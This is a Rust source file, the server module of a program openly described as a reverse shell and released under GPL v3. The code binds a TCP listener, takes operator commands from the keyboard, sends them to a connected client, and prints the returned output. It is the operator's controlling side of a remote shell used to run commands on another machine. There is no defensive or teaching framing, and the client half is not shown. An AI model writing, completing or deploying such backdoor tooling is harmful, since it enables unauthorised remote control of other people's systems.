/*

A reverse shell written in Rust.
Copyright (C) 2022-2023 simonfalke, Sherlock Holmes, Admiral Canaris

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.

*/

pub mod server_func {
	use std::io::prelude::*;
	use std::net::{TcpListener, TcpStream};
	use crate::Config;

	pub fn send_message(stream: &mut TcpStream, message: &String) {
		stream.write(message.as_bytes()).unwrap();
		stream.flush().unwrap();
	}

	pub fn get_command() -> String {
		let mut input = String::new();
		std::io::stdin().read_line(&mut input).unwrap();

		input
	}

	pub fn receive(stream: &mut TcpStream) -> String {
		let mut data = String::new();
		loop {
			let mut buffer = [0; 1024];
			stream.read(&mut buffer).unwrap();
			let mut converted = String::from_utf8_lossy(&buffer).to_string();
			converted = converted.replace("\0", "");
			converted = converted.trim().to_string();
			if converted.lines().last().unwrap() == "MESSAGEDONE" {
				break;
			}
			data.push_str(&converted.trim());
		}

		data
	}

	pub fn handle_client(mut stream: TcpStream) {
		loop {
			let command = get_command();
			send_message(&mut stream, &command);
			let mut data = receive(&mut stream);
			data = data.replace("\0", "");
			println!("Data received: {}", data);
		}
	}

	pub fn server_main(conf: Config) {
		let listener = TcpListener::bind(format!("{}:{}", conf.ip, conf.port.to_string())).unwrap();
		println!("Listening at 127.0.0.1 on port {}", conf.port);
		for stream in listener.incoming() {
			match stream {
				Ok(stream) => {
					handle_client(stream);
				}
	
				Err(e) => {
					println!("Error: {}", e);
				}
			}
		}
	}
}
